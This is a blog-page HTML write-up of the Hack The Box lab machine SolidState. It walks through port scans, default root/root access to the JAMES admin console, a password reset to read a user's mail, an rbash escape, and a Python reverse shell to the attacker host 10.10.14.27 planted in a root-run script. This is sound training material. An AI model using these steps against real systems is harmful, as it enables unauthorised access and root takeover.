@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Hack The Box - SolidState - DiegoExploit
+        
+    </title>
+    <style>
+  #carbonads {
+    border: 1px solid black;
+    border-radius: 7px;
+    border-spacing: 7px;
+    display: block;
+    overflow: hidden;
+    padding: 1em;
+    line-height: 1.5;
+  }
+  #carbonads span {
+    position: relative;
+    display: block;
+    overflow: hidden;
+  }
+  .carbon-img {
+    float: left;
+    margin-right: 1em;
+  }
+  .carbon-img img {
+    display: block;
+  }
+  .carbon-text {
+    display: block;
+    float: left;
+    max-width: calc(100% - 130px - 1em);
+    text-align: left;
+  }
+  .carbon-poweredby {
+    position: absolute;
+    left: 142px;
+    bottom: 0;
+    display: block;
+    font-size: .8em;
+    line-height: 1;
+    letter-spacing: 1px;
+    }
+    </style>
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-P385GSF');</script>
+<!-- End Google Tag Manager -->
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P385GSF"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+    <style>
+      #htbbadge{
+        float: left;
+      }
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="DiegoExploit" type="application/rss+xml">
+</head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>DiegoExploit</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+</ul>
+<h1 id="Categories Windows"><a href="#Categories Windows" class="headerlink" title="Categories Windows"></a>Categories Windows</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/legacy/">1. Hack The Box - Legacy</a></li>
+<li><a href="/hack-the-box/devel/">2. Hack The Box - Devel</a></li>
+<li><a href="/hack-the-box/optimum/">3. Hack The Box - Optimum</a></li>
+<li><a href="/hack-the-box/bastard/">4. Hack The Box - Bastard</a></li>
+<li><a href="/hack-the-box/artic/">5. Hack The Box - Artic</a></li>
+<li><a href="/hack-the-box/grandpa/">6. Hack The Box - Grandpa</a></li>
+<li><a href="/hack-the-box/granny/">7. Hack The Box - Granny</a></li>
+<li><a href="/hack-the-box/blue/">8. Hack The Box - Blue</a></li>
+<li><a href="/hack-the-box/silo/">9. Hack The Box - Silo</a></li>
+<li><a href="/hack-the-box/bounty/">10. Hack The Box - Bounty</a></li>
+<li><a href="/hack-the-box/jerry/">11. Hack The Box - Jerry</a></li>
+<li><a href="/hack-the-box/conceal/">12. Hack The Box - Conceal</a></li>
+<li><a href="/hack-the-box/chatterbox/">13. Hack The Box - Chatterbox</a></li>
+<li><a href="/hack-the-box/forest/">14. Hack The Box - Forest</a></li>
+<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
+<li><a href="/hack-the-box/secnotes/">16. Hack The Box - Secnotes</a></li>
+<li><a href="/hack-the-box/bastion/">17. Hack The Box - Bastion</a></li>
+
+</ul>
+<h1 id="Categories Linux"><a href="#Categories Linux" class="headerlink" title="Categories Linux"></a>Categories Linux</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/lame/">1. Hack The Box - Lame</a></li>
+<li><a href="/hack-the-box/popcorn/">2. Hack The Box - Popcorn</a></li>
+<li><a href="/hack-the-box/beep/">3. Hack The Box - Beep</a></li>
+<li><a href="/hack-the-box/tenten/">4. Hack The Box - Tenten</a></li>
+<li><a href="/hack-the-box/cronos/">5. Hack The Box - Cronos</a></li>
+<li><a href="/hack-the-box/brainfuck/">6. Hack The Box - brainfuck</a></li>
+<li><a href="/hack-the-box/shocker/">6. Hack The Box - Shocker</a></li>
+<li><a href="/hack-the-box/bashed/">7. Hack The Box - Bashed</a></li>
+<li><a href="/hack-the-box/nibbles/">8. Hack The Box - Nibbles</a></li>
+<li><a href="/hack-the-box/nineveh/">9. Hack The Box - Nineveh</a></li>
+<li><a href="/hack-the-box/sense/">10. Hack The Box - Sense</a></li>
+<li><a href="/hack-the-box/solidstate/">11. HTB - SolidState</a></li>
+<li><a href="/hack-the-box/kotarak/">12. Hack The Box - Kotarak</a></li>
+<li><a href="/hack-the-box/node/">13. Hack The Box - Node</a></li>
+<li><a href="/hack-the-box/valentine/">14. Hack The Box - Valentine</a></li>
+<li><a href="/hack-the-box/poison/">15. Hack The Box - Poison</a></li>
+<li><a href="/hack-the-box/sunday/">16. Hack The Box - Sunday</a></li>
+<li><a href="/hack-the-box/tartasauce/">17. HTB - Tartasauce</a></li>
+<li><a href="/hack-the-box/friendzone/">18. HTB - Friendzone</a></li>
+<li><a href="/hack-the-box/swagshop/">19. HTB- SwagShop</a></li>
+<li><a href="/hack-the-box/jarvis/">20. Hack The Box Jarvis</a></li>
+</ul>
+
+
+
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <br>
+  <h1 id="Hack-The-Box-SolidState"><a href="#Hack-The-Box-SolidState" class="headerlink" title="Hack The Box - SolidState"></a>Hack The Box - SolidState</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>SolidState is a medium difficulty machine that requires chaining of multiple attack vectors in order to get a privileged shell. As a note, in some cases the exploit may fail to trigger more than once and a machine reset is required. Its IP address is <code>10.10.10.51</code> Let’s go to hack!!!<br><img src="/images/hackthebox/exploit/solidstate/0.png" alt=""></p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2>
+<p>As always we will start with <code>nmap</code> to scan for open ports and services:
+
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/solidstate)
+ |
+ |-->{SFire129}#nmap -p- -T5 10.10.10.51
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-10 10:48 EDT
+ Nmap scan report for 10.10.10.51
+ Host is up (0.11s latency).
+ Not shown: 65529 closed ports
+ PORT     STATE SERVICE
+ 22/tcp   open  ssh
+ 25/tcp   open  smtp
+ 80/tcp   open  http
+ 110/tcp  open  pop3
+ 119/tcp  open  nntp
+ 4555/tcp open  rsip
+ 
+ Nmap done: 1 IP address (1 host up) scanned in 363.86 seconds<br></figure></pre>
+ <p>Extract in a file the ports, for scan vulnerability with nmap.
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/solidstate)
+ |
+ |-->{SFire129}#nmap -p 110,119,22,25,4555,80 -sC -sV -oA targeted --script vuln 10.10.10.51
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-10 15:41 EDT
+ Pre-scan script results:
+ | broadcast-avahi-dos:
+ |   Discovered hosts:
+ |     224.0.0.251
+ |   After NULL UDP avahi packet DoS (CVE-2011-1002).
+ |_  Hosts are all up (not vulnerable).
+ Nmap scan report for 10.10.10.51
+ Host is up (0.11s latency).
+ 
+ PORT     STATE SERVICE     VERSION
+ 22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ 25/tcp   open  smtp        JAMES smtpd 2.3.2
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ | smtp-vuln-cve2010-4344:
+ |_  The SMTP server is not Exim: NOT VULNERABLE
+ |_sslv2-drown:
+ 80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ | http-csrf:
+ | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.51
+ |   Found the following possible CSRF vulnerabilities:
+ |
+ |     Path: http://10.10.10.51:80/
+ |     Form id: name
+ |     Form action: #
+ |
+ |     Path: http://10.10.10.51:80/about.html
+ |     Form id: name
+ |     Form action: #
+ |
+ |     Path: http://10.10.10.51:80/index.html
+ |     Form id: name
+ |     Form action: #
+ |
+ |     Path: http://10.10.10.51:80/services.html
+ |     Form id: name
+ |_    Form action: #
+ |_http-dombased-xss: Couldn't find any DOM based XSS.
+ | http-enum:
+ |   /README.txt: Interesting, a readme.
+ |_  /images/: Potentially interesting directory w/ listing on 'apache/2.4.25 (debian)'
+ |_http-server-header: Apache/2.4.25 (Debian)
+ | http-sql-injection:
+ |   Possible sqli for queries:
+ |     http://10.10.10.51:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider
+ |     http://10.10.10.51:80/assets/js/?C=N%3bO%3dD%27%20OR%20sqlspider
+ |     http://10.10.10.51:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider
+ |     http://10.10.10.51:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider
+ |     http://10.10.10.51:80/assets/?C=M%3bO%3dA%27%20OR%20sqlspider
+ |     http://10.10.10.51:80/assets/?C=D%3bO%3dA%27%20OR%20sqlspider
+ |     http://10.10.10.51:80/assets/?C=N%3bO%3dD%27%20OR%20sqlspider
+ |     http://10.10.10.51:80/assets/?C=S%3bO%3dA%27%20OR%20sqlspider
+ |     http://10.10.10.51:80/assets/js/?C=M%3bO%3dD%27%20OR%20sqlspider
+ |     http://10.10.10.51:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider
+ |     http://10.10.10.51:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider
+ |     http://10.10.10.51:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider
+ |     http://10.10.10.51:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider
+ |     http://10.10.10.51:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider
+ |     http://10.10.10.51:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider
+ |     http://10.10.10.51:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider
+ |     http://10.10.10.51:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider
+ |     http://10.10.10.51:80/assets/js/?C=S%3bO%3dD%27%20OR%20sqlspider
+ |     http://10.10.10.51:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider
+ |_    http://10.10.10.51:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider
+ |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+ | vulners:
+ |   cpe:/a:apache:http_server:2.4.25:
+ |       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
+ |       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668
+ |       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169
+ |       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167
+ |       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211
+ |       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
+ |       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
+ |       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082
+ |       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788
+ |       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
+ |       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
+ |       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
+ |       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
+ |       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081
+ |       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
+ |       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196
+ |       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
+ |       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333
+ |       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798
+ |       CVE-2017-7659   5.0     https://vulners.com/cve/CVE-2017-7659
+ |       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
+ |       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197
+ |       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
+ |       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763
+ |_      CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
+ 110/tcp  open  pop3        JAMES pop3d 2.3.2
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ |_sslv2-drown:
+ 119/tcp  open  nntp        JAMES nntpd (posting ok)
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ |_sslv2-drown:
+ 4555/tcp open  james-admin JAMES Remote Admin 2.3.2
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+ 
+ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 125.54 seconds <br></figure></pre>
+ <h2 id="Enumerate"><a href="#Enumerate" class="Enumerate" title="Enumerate"></a>Enumerate</h2>
+ <p>The port 4555 looks a service vulnerable, with default credentials root/root, try to authenticate.
+  <pre><figure class="highlight plain"> |-->{SFire129}#cd HackTheBox/solidstate/
+ |-------(root@kali)-------|(~/HackTheBox/solidstate)
+ |
+ |-->{SFire129}#telnet 10.10.10.51 4555
+ Trying 10.10.10.51...
+ Connected to 10.10.10.51.
+ Escape character is '^]'.
+ JAMES Remote Administration Tool 2.3.2
+ Please enter your login and password
+ Login id:
+ root
+ Password:
+ root
+ Welcome root. HELP for a list of commands
+ help
+ Currently implemented commands:
+ help                                    display this help
+ listusers                               display existing accounts
+ countusers                              display the number of existing accounts
+ adduser [username] [password]           add a new user
+ verify [username]                       verify if specified user exist
+ deluser [username]                      delete existing user
+ setpassword [username] [password]       sets a user's password
+ setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
+ showalias [username]                    shows a user's current email alias
+ unsetalias [user]                       unsets an alias for 'user'
+ setforwarding [username] [emailaddress] forwards a user's email to another email address
+ showforwarding [username]               shows a user's current email forwarding
+ unsetforwarding [username]              removes a forward
+ user [repositoryname]                   change to another user repository
+ shutdown                                kills the current JVM (convenient when James is run as a daemon)
+ quit                                    close connection<br></figure></pre>
+ <p>List the users and change password for read mails.
+ <pre><figure class="highlight plain"> listusers
+ Existing accounts 6
+ user: james
+ user: ../../../../../../../../etc/bash_completion.d
+ user: thomas
+ user: john
+ user: mindy
+ user: mailadmin
+ setpassword mindy 123456
+ Password for mindy reset<br></figure></pre>
+ <p>Connect to pop3 service in the port 110 and read mails.
+ <pre><figure class="highlight plain">|-------(root@kali)-------|(~/HackTheBox/solidstate)
+ |
+ |-->{SFire129}#telnet 10.10.10.51 110
+ Trying 10.10.10.51...
+ Connected to 10.10.10.51.
+ Escape character is '^]'.
+ +OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready
+ USER mindy
+ +OK
+ PASS 123456
+ +OK Welcome mindy
+ LIST
+ +OK 2 1945
+ 1 1109
+ 2 836
+ .
+ RETR 2
+ +OK Message follows
+ Return-Path: <mailadmin@localhost>
+ Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
+ MIME-Version: 1.0
+ Content-Type: text/plain; charset=us-ascii
+ Content-Transfer-Encoding: 7bit
+ Delivered-To: mindy@localhost
+ Received: from 192.168.11.142 ([192.168.11.142])
+           by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
+           for <mindy@localhost>;
+           Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
+ Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
+ From: mailadmin@localhost
+ Subject: Your Access
+ 
+ Dear Mindy,
+ 
+ 
+ Here are your ssh credentials to access the system. Remember to reset your password after your first login.
+ Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path.
+ 
+ username: mindy
+ pass: P@55W0rd1!2@
+ 
+ Respectfully,
+ James
+ .<br></figure></pre>
+ <p>The mail shown user/password mindy/P@55w0rd1!2@ for connect by ssh service, but when to connect, the interactive shell not allow a lot commands.
+   <pre><figure class="highlight plain"> mindy@solidstate:~$ id
+ -rbash: id: command not found
+ mindy@solidstate:~$ whoami
+ -rbash: whoami: command not found
+ mindy@solidstate:~$
+ -rbash: curls: command not found
+ mindy@solidstate:~$ curl
+ -rbash: curl: command not found
+ mindy@solidstate:~$ wget
+ -rbash: wget: command not found
+ mindy@solidstate:~$<br></figure></pre>
+ <p>Deauthenticate and authenticate with <code>'bash --noprofile'</code> option.
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/solidstate)
+ |
+ |-->{SFire129}#ssh mindy@10.10.10.51 'bash --noprofile'
+ mindy@10.10.10.51's password:
+ id
+ uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
+ which python
+ /usr/bin/python
+ which python3
+ /usr/bin/python3
+ python3 -c 'import pty; pty.spawn("/bin/bash")'
+ ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$
+ ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ wget
+ wget
+ wget: missing URL
+ Usage: wget [OPTION]... [URL]...
+ 
+ Try `wget --help' for more options.
+ ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ curl
+ curl
+ curl: try 'curl --help' or 'curl --manual' for more information
+ ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$</figure></pre>
+ <p>Form Kali Linux http server, download the <code>EnumLin.sh</code> to enumerate the system.
+  <pre><figure class="highlight plain"> ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ curl 10.10.14.27/LinEnum.sh -o enum.sh
+ solidstate:~$ curl 10.10.14.27/LinEnum.sh -o enum.sh
+   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                  Dload  Upload   Total   Spent    Left  Speed
+ 100   469  100   469    0     0   2092      0 --:--:-- --:--:-- --:--:--  2103
+ ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ls
+ ls
+ bin  enum.sh  user.txt
+ ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$</figure></pre>
+<p>The scritp show a file <code>tmp.py</code> with several privileges.
+ <img src="/images/hackthebox/exploit/solidstate/2.png" alt=""></p>
+ <p>Add the next script for reverse conection and run nc listening on kali linux.
+  <pre><figure class="highlight plain"> import socket
+ import subprocess
+ import os
+
+ s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+ s.connect(("10.10.14.27",4445))
+ os.dup2(s.fileno(),0)
+ os.dup2(s.fileno(),1)
+ os.dup2(s.fileno(),2)
+ p=subprocess.call(["/bin/sh","-i"])</figure></pre>
+ <p>Create a <code>monitor.sh</code> for monitoring activity on server and to verify if the tmp.py run.
+ <pre><figure class="highlight plain"> IFS=$'\n'
+ op=$(ps -eo command)
+
+ while true;do
+         np=$(ps -eo command)
+         diff <(echo "$op") <(echo "$np")
+         sleep .2
+         op=$np
+ done</figure></pre>
+<h2 id="Exploit"><a href="#Exploit" class="Exploit" title="Exploit"></a>Exploit</h2>
+<p>In the netcat reverse connection we have a shell with root privileges.
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/solidstate)
+ |
+ |-->{SFire129}#nc -nvlp 4445
+ listening on [any] 4445 ...
+ connect to [10.10.14.27] from (UNKNOWN) [10.10.10.51] 60752
+ /bin/sh: 0: can't access tty; job control turned off
+ # # # #
+ # id
+ uid=0(root) gid=0(root) groups=0(root)</figure></pre>
+ <h2 id="Capture-The-Flag"><a href="#Capture-The-Flag" class="Capture-The-Flag" title="Capture-The-Flag"></a>Capture The Flag</h2>
+
+<pre><figure class="highlight plain"># cat /home/mindy/user.txt
+***Here you could find the user flag***
+# find . -name *root.txt -exec wc -c {} \;
+33 ./root.txt
+# cat /root.txt
+cat: /root.txt: No such file or directory
+# cat ./root.txt
+***Here you could find the root flag***</figure></pre>
+
+ 
+<p> And we owned root !</p>
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avatar.png" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>DiegoExploit</div>
+      <div>2020-06-10</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>
+
+      <a class="tag-link" href="/tags/linux/" rel="tag">#Linux</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#Exploit</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#pop3</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
